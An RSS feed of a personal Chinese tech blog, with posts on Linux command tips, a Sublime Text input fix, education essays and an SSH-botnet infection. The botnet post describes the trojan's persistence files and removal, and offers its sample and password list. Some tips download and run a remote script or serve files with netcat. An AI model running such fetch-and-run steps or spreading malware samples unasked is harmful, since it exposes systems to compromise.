把它放到/usr/share/app-install/icons/stardict.svg 然后修改/usr/share/applications/stardict.desktop的Icon=/usr/share/app-install/icons/stardict.svg.</description>
    </item>
    
    <item>
      <title>好玩的Linux命令行_II</title>
      <link>https://wrfly.kfd.me/posts/%E5%A5%BD%E7%8E%A9%E7%9A%84linux%E5%91%BD%E4%BB%A4%E8%A1%8C_ii/</link>
      <pubDate>Tue, 09 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E5%A5%BD%E7%8E%A9%E7%9A%84linux%E5%91%BD%E4%BB%A4%E8%A1%8C_ii/</guid>
      <description>这条网站上统计了很多很多好玩有用的命令，感兴趣的同学可以看一下哦！ http://www.commandlinefu.com/commands/browse/sort-by-votes/
下面这些是我从上面摘抄的，但是也请转载注明出处～
先装上pv，然后再敲这一条，会把你帅呆了的！
echo &amp;#34;You can simulate on-screen typing just like in the movies&amp;#34; | pv -qL 10 来，测试一下咱的硬盘有多快：
timeout 2s yes &amp;#34;hello world!&amp;#34; &amp;gt; big_file &amp;amp; watch du -h big_file 常用的20条命令++
history | awk &amp;#39;{a[$2]++}END{for(i in a){print a[i] &amp;#34; &amp;#34; i}}&amp;#39; | sort -rn | head 文字版星球大战!!!
telnet towel.blinkenlights.nl 在终端右上角显示个表
去tmp目录下逛一圈再回来(小括号代表子shell)
(cd /tmp &amp;amp;&amp;amp; ls) nc用来传文件：
nc -v -l 80 &amp;lt; file.ext 更改文件后缀名，把wrfly.png改成wrfly.jpg：
mv wrfly.{png,jpg} 把命令的输出内容转换成图片，超酷炫：
ifconfig | convert label:@- ip.</description>
    </item>
    
    <item>
      <title>These-days</title>
      <link>https://wrfly.kfd.me/posts/these-days/</link>
      <pubDate>Sun, 07 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/these-days/</guid>
      <description>突如其来的就想用英语写点东西了，好，就用英语写篇不算日记的日记吧。
Let&amp;rsquo;s talk about what i have done these days&amp;hellip;
First, I took part in a CTF game and tried to figured out a problem which ask me to find a flag in a broken disk image.And, my disk was broken&amp;hellip;.
Second, my GPT(GUID Partition Table) was broken and I lost lots of files.
Third, I changed my HHD to a SSD.
Not all yet.
Finally I found all my files without filenames&amp;hellip;.</description>
    </item>
    
    <item>
      <title>让sublime text 支持中文输入（ubuntu）</title>
      <link>https://wrfly.kfd.me/posts/%E8%AE%A9sublime-text-%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5ubuntu/</link>
      <pubDate>Fri, 05 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E8%AE%A9sublime-text-%E6%94%AF%E6%8C%81%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5ubuntu/</guid>
      <description>解决在ubuntu下用 sublime_text_3 输入中文的问题。
只解决问题，不废话：
cd /opt/sublime_text &amp;amp;&amp;amp;\ sudo wget &amp;#34;https://gist.githubusercontent.com/wrfly/baf1314ae25f41fe8cde/raw/45c669808bed8eb6d98fe6caa3f730076e5aede3/imfix.c&amp;#34; &amp;amp;&amp;amp;\ sudo apt-get install build-essential libgtk2.0-dev &amp;amp;&amp;amp;\ sudo gcc -shared -o imfix.so imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC &amp;amp;&amp;amp;\ sudo sed -i &amp;#34;s/exec/LD_PRELOAD=\/opt\/sublime_text\/imfix.so/&amp;#34; /usr/bin/subl &amp;amp;&amp;amp;\ sudo sed -i &amp;#34;s/\/opt\/sublime_text\/sublime_text/subl/g&amp;#34; /usr/share/applications/sublime_text.desktop &amp;amp;&amp;amp;\ echo &amp;#34;Succeed!&amp;#34; 如果你还嫌麻烦的话，没关系～
一键安装脚本在这儿：
wget https://gist.githubusercontent.com/wrfly/5f4187be96d93e95ad07/raw/15953c30b549efb4185df6d229324e465d279606/auto_imfix.sh 然后运行就好了 :)
部分引用自http://html5beta.com/page/ubuntu-14-04-install-fcitx-sougoupinyin-sublime-text-3-chinese-input-fix.html</description>
    </item>
    
    <item>
      <title>乌合之众-教育篇</title>
      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87/</link>
      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87/</guid>
      <description>第五条导火索：教育 　人们常常会持有一项错误的观点：教育能够使人大大改变。
　这种观点坚持认为，教育会万无一失地改造民众，甚至于把他们变成平等的人。
　这种观点被人们不断地重复，当它被重复得足够多时，就足以让它最终成为最牢固的民主信条。以至于今天要想击败这种观念，就像过去击败教会一样困难。
　然而我们要说的是，教育既不会使人变得更道德，也不会使他更幸福；它既不能改变他的本能，也不能改变他天生的热情。
　甚至在某些时候，只要进行不良引导，教育的坏处还会大于好处。
　统计学家在这个方面为我们提供了佐证，根据他们的观点，犯罪随着教育，至少是某种教育的普及而增加，社会的一些最坏的敌人，也是在学校获奖者名单上有案可查的人。
　根据一本著作显示，目前受过教育的罪犯和文盲罪犯的比率是3：1，在50年的时间里，人口中的犯罪比例从每10万居民227人上升到了552人，增长了整整1.3倍之多。
　这一点在法国体现得尤为显著，因为法国的年轻人犯罪率大幅度攀升，而人尽皆知的是，法国为了这些年轻人，已经用免费义务制教育取代了交费制。而那些成为社会敌人的社会主义者，往往是受过高等教育的人群。
　之所以会产生这样的危险状况，都是因为这种教育制度建立在一个错误的心理学基础上面，这种基础认为，智力是通过一心学好教科书来提高的，只要一个人的成绩足够好，那么他的智力就会获得稳步提高。
　由于接受了这种观点，人们便尽可能强化许多手册中的知识。从小学直到离开大学，一个年轻人只能死记硬背书本，他的独立思考能力和个人意识从来派不上用场。受教育对于他来说就是背书和服从。
　于是，许多孩子在学校里开始对着一篇篇语法和纲要努力，做到准确重复，出色模仿，直到变成学舌的鹦鹉为止，这种教育的惟一结果，就是贬低自我，让我们变得无能。
　如果这种应试教育仅仅是无用，人们还可以对孩子们示以同情，这些虽然没有在小学里从事必要的学习，但好歹还被教会了一些科劳泰尔后裔的族谱、纽斯特里亚和奥斯特拉西亚之间的冲突或动物分类之类的知识。然而，这种制度造成的危险要远比这严重得多，一个最直接的后果就是，它使服从它的人强烈地厌恶自己的生活状态，极想逃之夭夭。
　应试教育的结果是，工人不想再做工人，农民不想再当农民，而大多数中产阶级，除了吃国家职员这碗饭以外，不想让他们的儿子从事任何别的职业。学习的唯一目的不是让人为生活做好准备，而是只打算让他们从事政府的职业，在这样的行当里想要取得成功，根本不需要无需任何必要的自我定向，或表现出哪怕一点个人的主动性。
　说到底，应试教育制度在社会等级的最底层创造了一支无产阶级大军，这个群体对自己的命运忿忿不平，随时都想起来造反。
　而在最高层，它又培养出一群轻浮的权贵阶级，他们既多疑又轻信，对国家抱着迷信般的信任，把它视同天道，却又时时不忘对它表示敌意，总是把自己的过错推给政府，离开了当局的干涉，他们便一事无成。
　尽管国家用教科书制造出这么多有文凭的人，然而它只能利用其中的一小部分，于是只好让另一些人无事可做。因此，它只能把饭碗留给先来的，剩下的没有得到职位的人便全都成了国家的敌人。
　从社会金字塔的最高层到最低层，从最卑贱的小秘书到教授和警察局长，有大量炫耀着文凭的人在围攻各种政府部门的职位。商人想找到一个代替他处理殖民地生意的人难上加难，可是成千上万的人却在谋求最平庸的官差。
　只在塞纳一地，就有几千名男女教师失业，这些人全都蔑视农田或工厂，只想从国家那儿讨生计，而被选中的人数却是有限的，因此肯定有大量心怀不满的人。他们随时会参与任何革命，不管它的头领是谁，也不管它有什么目标。
　可以说，掌握一些派不上用场的知识，是让人造反的不二法门。</description>
    </item>
    
    <item>
      <title>乌合之众-教育篇 (题外话-上)</title>
      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8A/</link>
      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8A/</guid>
      <description>关于应试教育的题外话（上） 　我们了解了引发群众运动的五大导火索，然而对于教育因素，我们还应当额外说上几句题外话。
　很明显，法国在教育制度上犯了不小的错误，它进行的唯一价值就是，为这个多灾多难的国家添加了数以万计的懒汉、寄生虫和不安定因素。放眼全世界，犯下此种错误的民族还大有存在。
　显然，迷途知返为时已晚。只有经验，这位民众最好的老师，最终会揭示出我们的错误。
　只有经验能够证明，必须废除我们那些可恶的教科书和可悲的考试，代之以勤劳的教育，让我们的年轻人回到田野和工厂，回到他们今天不惜任何代价逃避的辛勤开拓事业。
　我们必须再一次重申，向人灌输大量肤浅的知识，不出差错地背诵大量教科书，是绝对不可能提高人的智力水平的。
　在我们的生活中，能够帮助我们走向成功的条件是判断力，是经验，是开拓精神和个性！而这些优良品质，偏偏是不能从死啃书本中得来的，教科书和字典固然可以充当有用的参考工具，但长久把它们放在脑子里却没有任何用处。
　那么，我们该如何让孩子们接受到有益的教育，让它帮助孩子们获得正确的观念呢？
　要知道，观念只有在自然而正常的环境中才能形成。
　因此，我们需要年轻人每天从工厂、矿山、法庭、书房、建筑工地和医院获得大量的感官印象；他得亲眼看到各种工具、材料和操作；他得与顾客、工作者和劳动者在一起，不管他们干得是好是坏，也不管他们是赚是赔。
　只有采用这种方式，孩子们才能对那些从眼睛、耳朵、双手甚至味觉中得到的各种细节，有些微不足道的理解。学习者在不知不觉中获得了这些细节，默默地推敲，在心中逐渐成形，并且或迟或早会产生出一些提示，让他们着手新的组合、简化、创意、改进或发明。
　而我们的年轻人，却恰恰在最能出成果的年纪，被剥夺了所有这些宝贵的接触、所有这些不可缺少的学习因素，因为有七八年的时间他一直被关在学校里，切断了一切亲身体验的机会，因此对于世间的人和事，对于控制这些人和事的各种办法，不可能得到鲜明而准确的理解。
　毫不客气地说，在十个人里面，就有九个人在几年里把他们的时间和努力浪费掉了，而且可以说，这是非常重要的、甚至是决定性的几年。他们中间有一半甚至三分之二的人，是为了考试而活着，然后被残酷地淘汰掉。
　另外一半或者三分之一，成功地得到了某种学历、证书或一纸文凭在规定的某一天，坐在一把椅子上，面对一个答辩团，在连续两小时的时间里，怀着对科学家团体，即一切人类知识的活清单的敬畏，他们要做到正确或是绝对正确。
　然后，甚至用不了一个月，他们便不再是这样。他们不可能再通过考试。他们脑子里那些过多的、过于沉重的所学不断流失，且没有新东西补充进去。他们的精神活力衰退了，他们继续成长的能力枯竭了，一个得到充分发展的人出现了，然而他也是个筋疲力尽的人。
　他成家立业，落入生活的俗套，而只要落入这种俗套，他就会把自己封闭在狭隘的职业中，工作也许还算本份，但仅此而已。这就是平庸的生活，收益和风险不成比例的生活。</description>
    </item>
    
    <item>
      <title>乌合之众-教育篇 (题外话-下)</title>
      <link>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8B/</link>
      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E4%B9%8C%E5%90%88%E4%B9%8B%E4%BC%97-%E6%95%99%E8%82%B2%E7%AF%87-%E9%A2%98%E5%A4%96%E8%AF%9D-%E4%B8%8B/</guid>
      <description>关于应试教育的题外话（下） 　在教育青年人的方面，英国人与美国人明显做得更好。
　英国并没有我们那样多的专业学校。他们的教育并不是建立在啃书本上，而是建立在专业课程上。
　比如说，英国人的工程师并不是在学校学出来的，而是在车间里训练出来的。这种办法表明，每个人都能达到他的智力允许他达到的水平。
　如果他是个平庸的人，没有进一步发展的能力，他可以成为工人或领班，如果天资不俗的话，他便会成为工程师。与个人前程全取决他在19岁时一次几小时考试的做法相比，这种办法更民主，对社会的好处也更多。
　在医院、矿山和工厂，在建筑师或律师的办公室里，那些十分年轻便开始学业的学生们，按部就班地经历他们的学徒期，在投入实际工作之前，他们也有机会接受一些一般性的教育过程，因此已经准备好了一个框架，可以把他们迅速观察到的东西储存进去，而且他能够利用自己在空闲时间得到的各种各样的技能，逐渐把自己充实成为一个全面而健康的人。
　在这样的制度下，学生的实践能力得到了发展，并且与学生的才能相适应，发展方向也符合他未来的任务和特定工作的要求，因为这些工作就是他今后要从事的工作。
　正因为如此，英国和美国的年轻人很快便处在能够尽量发挥自己能力的位置上。他不但成了一个有用的工作者，甚至具备自我创业的能力；他不只是机器上的一个零件，而且变成了一部发动机。
　我们不妨看一下笛福的小说主人公鲁宾逊，尽管他只是一个文学形象，却反映了英国教育的成功，当鲁宾逊流落于荒岛上时，他发挥了自己的全部能力，像一个完整的社会体系那样，白手创立了一番事业，而这正和英美两国的教育目标相一致。
　而在制度与此相反的法国，一代又一代人越来越向中国看齐，由此造成的人力浪费还能够接受，然而这种教育制度与实践生活不断脱节的趋势却令人着实难忍。
　如果从考试、学历、证书和文凭的角度看，坐在学校板凳上啃理论和教科书的时间是有点长得过头了，而且负担过重。即使是采用的方法也糟糕透顶，以至于已经成为了一种严重违反自然的、与社会对立的制度。
　为此，我们不妨看一下我们的教育制度都做了些什么。
　过多地延长实际的学徒期、培养懒汉的寄宿制度、过多的人为的训练和填鸭式教学、繁重的功课、对今后的时代完全没有考虑、对人的职业缺乏安排、对年轻人很快就要投身其中的现实世界装聋作哑、不考虑学生如何适应社会、不考虑人类为保护自己而必须从事的斗争、不教给学生如何保持坚强意志……
　反过来呢？所有必要的准备、所有最重要的学习、那些丰富的常识、坚忍不拔的意志力、凡是该赋予年轻人的东西，我们的学校一样也没有教。
　这样看起来，我们的教育不但远远没有让他们获得生存能力的素质，反而破坏了他们的这种素质。
　正因为该准备的没有准备，才使得我们的年轻人一旦走入社会，进入他的活动领域，就开始遭遇一系列的痛苦与挫折，由此给他造成的创痛久久不能痊愈，有时甚至失去生活能力。
　可以说，这样的教育制度，对年轻人的精神和道德都造成了不良影响，甚至存在着难于恢复的可能，
　在年轻人的心目中，那种在学校中形成的幻想与美梦，在严酷的现实面前，彻底地破灭了，这种强烈的欺骗感、强烈的失望感，是一个心理素质不完备的青年人绝对难以承受的。
　也许有人会认为，以上对于教育制度的批判，已经严重脱离了群体心理学的主题。然而可曾有人想过，那些今日正在群体中酝酿，明日就会出现的各种想法和信念，究竟是怎样产生的呢？它产生的土壤又究竟是怎样的呢？
　当我们了解了现实之后，就更有理由知道，那些被恶化的群众头脑，究竟是如何由当前的制度培养出来的，冷漠而中立的群众是如何变成了一支心怀不满的大军，随时打算听从一切乌托邦分子和能言善辩者的暗示。
　如果我们不能认清这一点，还任由我们的学校培养一批批狂热的暴徒、无知的民众，那么可以预见的是，在不远的将来，为我们的民族走向衰败铺平道路的，必将是我们的学校。</description>
    </item>
    
    <item>
      <title>screen in linux</title>
      <link>https://wrfly.kfd.me/posts/screen-in-linux/</link>
      <pubDate>Thu, 28 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/screen-in-linux/</guid>
      <description>本文转自IBM developterWorks
你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。
元凶：SIGHUP 信号 让我们来看看为什么关掉窗口/断开连接会使得正在运行的程序死掉。
在Linux/Unix中，有这样几个概念：
 进程组（process group）：一个或多个进程的集合，每一个进程组有唯一一个进程组ID，即进程组长进程的ID。 会话期（session）：一个或多个进程组的集合，有唯一一个会话期首进程（session leader）。会话期ID为首进程的ID。 会话期可以有一个单独的控制终端（controlling terminal）。与控制终端连接的会话期首进程叫做控制进程（controlling process）。当前与终端交互的进程称为前台进程组。其余进程组称为后台进程组。
 根据POSIX.1定义：
 挂断信号（SIGHUP）默认的动作是终止程序。
当终端接口检测到网络连接断开，将挂断信号发送给控制进程（会话期首进程）。 如果会话期首进程终止，则该信号发送到该会话期前台进程组。 一个进程退出导致一个孤儿进程组中产生时，如果任意一个孤儿进程组进程处于STOP状态，发送SIGHUP和SIGCONT信号到该进程组中所有进程。
 因此当网络断开或终端窗口关闭后，控制进程收到SIGHUP信号退出，会导致该会话期内其他进程退出。
我们来看一个例子。打开两个SSH终端窗口，在其中一个运行top命令。
[root@tivf09 root]# top 在另一个终端窗口，找到top的进程ID为5180，其父进程ID为5128，即登录shell。
[root@tivf09 root]# ps -ef|grep top root 5180 5128 0 01:03 pts/0 00:00:02 top root 5857 3672 0 01:12 pts/2 00:00:00 grep top 使用pstree命令可以更清楚地看到这个关系：
[root@tivf09 root]# pstree -H 5180|grep top |-sshd-+-sshd---bash---top 使用ps-xj命令可以看到，登录shell（PID 5128）和top在同一个会话期，shell为会话期首进程，所在进程组PGID为5128，top所在进程组PGID为5180，为前台进程组。
[root@tivf09 root]# ps -xj|grep 5128 5126 5128 5128 5128 pts/0 5180 S 0 0:00 -bash 5128 5180 5180 5128 pts/0 5180 S 0 0:50 top 3672 18095 18094 3672 pts/2 18094 S 0 0:00 grep 5128 关闭第一个SSH窗口，在另一个窗口中可以看到top也被杀掉了。</description>
    </item>
    
    <item>
      <title>php dos</title>
      <link>https://wrfly.kfd.me/posts/php-dos/</link>
      <pubDate>Sun, 24 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/php-dos/</guid>
      <description>修复漏洞请下载php最新版，并按照官方文档进行配置
http://php.net/manual/zh/install.unix.nginx.php
这两天我也没少省心，尽管已经落后别人好远好远了。。
关于在php上打补丁，我觉得倒不如直接升级来的爽快
 升级总是有他的道理的 我懒得重新编译- -  今天一直在弄这个，把一些经验拿出来吧，当然，是给小白看的。
解压之后，先别急着 configure ，要在configure后面加参数
./configure --enable-fpm --with-mysql --enable-mbstring --with-mysqli  将以前用到php5-fpm的地方换成php-fpm
按照文档来，别像我一样不懂装懂就好了～～</description>
    </item>
    
    <item>
      <title>linux中的tar命令</title>
      <link>https://wrfly.kfd.me/posts/linux%E4%B8%AD%E7%9A%84tar%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 18 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux%E4%B8%AD%E7%9A%84tar%E5%91%BD%E4%BB%A4/</guid>
      <description>原文链接：http://www.tecmint.com/18-tar-command-examples-in-linux/
tar [-options(&amp;#34;-&amp;#34; is not necessary)] [name] [path or file(default current directory, if epmty)] 废话不多说，直接拿来用～
创建一个tar文档（打包文档） tar -cvf [name.tar] [path or file] #c-creat v-view(show the progress) f-file(并不会解释) 创建一个tar.gz文档（打包并压缩） tar -cvzf [name.tar.gz] [path or file] #z-compress file to **gzip** 创建tar.bz2文档（压缩，另一种形式） tar cvfj [name.tar.bz2] [path or file] #这次是 **j** 解压一个tar文件 (x-extract-uncompress) tar -xvf [name.tar or name.tar.gz or name.tar.bz2] -c [path] or tar xvf [name.tar or name.tar.gz or name.tar.bz2] #empty for current directory 查看压缩文件目录(list) tar tvf name.</description>
    </item>
    
    <item>
      <title>linux命令行工具妙用</title>
      <link>https://wrfly.kfd.me/posts/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%A6%99%E7%94%A8/</link>
      <pubDate>Wed, 13 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%E5%A6%99%E7%94%A8/</guid>
      <description>Fork from:http://mingxinglai.com/cn/2012/08/toos-of-bash/
前言：虽然现在各种动态脚本语言发展得热火朝天,一片欣欣向荣的景象,而且动态脚本语言如python确实学习成本低,入门快,虽然unix 下各种工具比我们很多人年龄都大,但是我还是相信一些有用的小工具在可预见的时间内不会消失,因为灵活运用它们能够快速解决很多小问题,而且你不大可能写出更短的代码来。
1. 一行命令算术运算 seq 100 | echo $[ $(tr &amp;#39;\n&amp;#39; &amp;#39;+&amp;#39;) 0] seq 5 3 20 | echo $[ $(tr &amp;#39;\n&amp;#39; &amp;#39;*&amp;#39;) 1] seq 用于产生一组等差的数列,默认首项和公差都是1,所以上面的第一行代码会产生1 －－ 100 的整数,且每个数占一行,使用tr 将换行替换成＋号以后,形成如1+2+......+100+的一行字符串,所以需要在字符串最后加一个0,最后使用echo $[ ]进行算数运算,也可以通过管道使用bc来计算seq 100 | echo $(tr &#39;\n&#39; &#39;+&#39;) 0 | bc。
2. 100的阶乘末尾有几个零？ 这是计算机专业面试的一个比较有名的题目,正确的解法答案是 n/5 + n/5/5 + n/5/5/5&amp;hellip;&amp;hellip; 下面我们写一行代码来验证一下
echo {1..100}|tr &amp;#39; &amp;#39; &amp;#39;*&amp;#39;|bc|tr &amp;#39;1-9&amp;#39; &amp;#39;\n&amp;#39;|sort -r| head -1|awk &amp;#39;{print length($0) }&amp;#39; 这里{1..100}属于通配符,例如你要新建100个文件,就可以touch test{1..100}.txt,还可以touch test{a..z}.txt。 算后计算出1乘到100的结果,将结果中非零的数字替换成换行符在1乘到100的结果中,必然是末尾的0最多 所以我们只需要在tr &#39;1-9&#39; &#39;\n&#39;之后,找出最长的那一行就可以了,这里使用的方法是先将结果逆序排序sort -r,然后打印第一行head -,计算出第一行的长度awk &#39;{print length($0)}&#39;。</description>
    </item>
    
    <item>
      <title>大数的阶乘</title>
      <link>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</link>
      <pubDate>Sun, 10 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E5%A4%A7%E6%95%B0%E7%9A%84%E9%98%B6%E4%B9%98/</guid>
      <description>To calculate factorial in linux c &amp;amp; bash shell &amp;amp; bc.
linux c version: #include &amp;lt;stdio.h&amp;gt;int big[10001][800],len[10001],BASE=10000; int i,j,tmp,up,n; void print(int n){ printf(&amp;#34;%d&amp;#34;,big[n][len[n]-1]); for(i=len[n]-2; i &amp;gt;= 0; i--)printf(&amp;#34;%04d&amp;#34;,big[n][i]); printf(&amp;#34;\n&amp;#34;); } int main(){ big[0][0] = big[1][0] = len[0] = len[1] = 1; //0和1的阶乘都是1  for(i=2; i&amp;lt;=10000; i++){ //计算10000以内的所有数的阶乘  up = 0; for(j=0; j&amp;lt;len[i-1]; j++){ tmp = up + i * big[i-1][j]; up = tmp / BASE; tmp = tmp % BASE; big[i][j] = tmp; } if(up &amp;gt; 0){ big[i][j] = up;len[i] = j+1; } else len[i] = j; } while(~scanf(&amp;#34;%d&amp;#34;,&amp;amp;n))print(n); return 0; } bash shell version: #!</description>
    </item>
    
    <item>
      <title>发生在我同学身上的SSH Psychos</title>
      <link>https://wrfly.kfd.me/posts/%E5%8F%91%E7%94%9F%E5%9C%A8%E6%88%91%E5%90%8C%E5%AD%A6%E8%BA%AB%E4%B8%8A%E7%9A%84ssh-psychos/</link>
      <pubDate>Sun, 03 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/%E5%8F%91%E7%94%9F%E5%9C%A8%E6%88%91%E5%90%8C%E5%AD%A6%E8%BA%AB%E4%B8%8A%E7%9A%84ssh-psychos/</guid>
      <description>今天下午bigtang过来说他的VPS也被lock了，DigitalOcean的staff说是有ddos攻击，第一反应是vps沦为了肉鸡，第二反应是，还真是被日了。
说起来都有点搞笑，一个搞安全的，自己的vps竟然也会被日，23333.
连接上VNC，登陆进去之后，发现本地目录多了一个 i 文件夹，ps -aux 会发现一些别的命令一直在运行（当时没有截图留念，真是可惜了），
首先做的是查看登录日志，发现在Apr 30这一天有几台主机一直在暴力登陆本机，ip段为43.255.190.0/23，香港的，一开始是以为这是几台肉鸡，被用来ssh爆破的，但是问题远远没有这么简单。
/var/log/btmp 文件是用来记录ssh登陆的，bigtang那个竟然有38M，我真是醉了，服务器的auth.log也不小，在四月三十号这天，ssh爆破进行了一天。。。唉，有个僵尸网络就是爽。。。大约爆破了十一个小时后，坏人成功了。
首先说一下这个木马会干什么: 1.创建开机启动脚本，放在/etc/init.d/目录下，文件名随机
2.创建周期脚本，每小时运行一次，/etc/cron.hourly/gcc.sh
3.创建一个可执行的so文件，放在 /lib/libudev.so
那么这个木马的恶心之处在于什么呢？ 文件不死，因为脚本一直在内存中运行，会不断检测自身是否存在于 /lib/libudev.so 这个文件中，如果不存在,则创建一个并且销毁存在于其他地方的自身。这一步完成之后，这个.so文件还会创建一个开机启动脚本并且设置为开机启动，然后他就会写入shell到gcc.sh,也就是/etc/cron.hourly/gcc.sh。
这就完了？不，远远没有，他还会自动检测其他的后门、病毒、和木马，并且删除掉他们，以确保自身的安全性和隐蔽性，最重要的是对于主机的完全控制权。 然后听从来自某台主机的命令，在某个时刻统一发起DDOS攻击。。。
我粗略的扫了一下 43.255.190.0/23 这个网段，大约开了72台，并且！每台主机都开着22端口和6006端口！那么，6006莫非就是他的后门通信端口？
更为具体的说明在这：
Threat Spotlight: SSHPsychos
Group Uses over 300,000 Unique Passwords in SSH Log-In Brute-Force Attacks
把精神病关进黑洞
看Level 3与思科如何联手除掉僵尸网络
也许还会有更为严重的后果，但是我只能看得到这么多了，坐等糖果逆向牛把它搞定。他说要反艹他们来着，23333，但是首先得有一份好的字典啊～
这是上面提供的那一部分密码字典，我在这里一并奉上，如果你有什么好的字典，记得在下面留言撒～
最重要的来了！怎样摆脱这个后门呢？ 既然我们删除不掉它，那怎样才能摆脱它呢？
其实很简单，利用权限。
chmod 444 /lib/libudev.so 这一条命令执行完成后，删除掉 /etc/cron.hourly/gcc.sh
rm /etc/cron.hourly/gcc.sh  并且查看/etc/init.d/目录下最近修改的文件，一本来说文件名会是一串乱码，记录这个名字，然后取消其开机启动的link
更新之后删除这个文件。重启。然后再删除掉 /lib/libudev.so 文件。
搞定。
最后的最后 如果有人想玩一下这个后门，可以在虚拟机里面搞一搞，文件上传至这儿</description>
    </item>
    
    <item>
      <title>Bash里面的&#34;与&#34;和&#34;或&#34;</title>
      <link>https://wrfly.kfd.me/posts/bash%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%8E%E5%92%8C%E6%88%96/</link>
      <pubDate>Wed, 29 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/bash%E9%87%8C%E9%9D%A2%E7%9A%84%E4%B8%8E%E5%92%8C%E6%88%96/</guid>
      <description>First, let&amp;rsquo;s see some interesting codes. There is a test.sh in the directory, and nothing else.
And&amp;rdquo;|&amp;rdquo;,&amp;rdquo;||&amp;rdquo;,&amp;rdquo;&amp;amp;&amp;amp;&amp;ldquo;,&amp;rdquo;&amp;gt;&amp;ldquo;,&amp;rdquo;$?&amp;rdquo; these symbols can be easily get via google.
When I type these commands, it&amp;rsquo;s very confused.
$ ls | grep asda &amp;amp;&amp;amp; echo $? $ ls | grep asda || echo $? 1 $ ls | grep test || echo $? test.sh $ ls | grep test &amp;gt; /dev/null || echo $? $ ls | grep test &amp;gt; /dev/null &amp;amp;&amp;amp; echo $?</description>
    </item>
    
    <item>
      <title>Nginx搭建反向代理服务</title>
      <link>https://wrfly.kfd.me/posts/nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/</link>
      <pubDate>Sat, 25 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wrfly.kfd.me/posts/nginx%E6%90%AD%E5%BB%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1/</guid>
      <description>这几天一直没有更新博客，可不要以为我在偷懒哦～除了去图书馆找了几本书看之外，我还get了一个新技能，正如标题所言，反向代理。
去年的时候我就接触过这种反向代理了，那时候是因为goagent太不稳定，不得不找一个php站来代理上网，然后我就偶然之中发现了php反代理这种东西，说白了，就是让php去帮你请求资源，然后再返还给你。如果感兴趣可以翻一下我之前写过的一篇php反代理的，当然，代码不是我写的- -，搜索7ghost也会的到你想要的东西。
进入正题之前，感谢那些分享知识的前辈们，我是在参考了他们的文章之后学习到很多东西。
奉上详细链接：
Nginx反向代理、负载均衡、页面缓存、URL重写及读写分离详解
Nginx官方文档
nginx反向代理配置
调度算法
其中第一篇已经写的很详细了，有关正向代理，反向代理的介绍什么的；第二篇是nginx的官方文档，也是最最详细和标准的一个；第三篇是我参考的文件，第一遍当然看不懂，但是理解了每句话的内容之后也就明白了，下面的评论也挺搞笑的～。
那我们就开始步入正题吧！
 关于学习，无非就是，是什么，为什么，和怎样做。
 是什么？ 首先说明反向代理（reverse proxy）是什么，但是在这之前要先说明正向代理是什么，没错，真有正向代理（proxy）。
我们平时所说的代理就是正向代理，最常见的就是QQ代理，和VPN代理，以前的QQ主登陆界面的背面都会藏着一些设置选项，最醒目的就是代理，什么http代理啊，socks代理啊，https代理啊，我觉得这个功能是提供给那些在公司里面上不了QQ的人准备的，为什么上不了QQ？老板不让呗！所以就出现了“代理”这个工具，包括现在，也有很多网站提供免费的在线代理（我不是来打广告哒！），有匿名的，也有非匿名的，但是安全性，嘿嘿，真不好说。
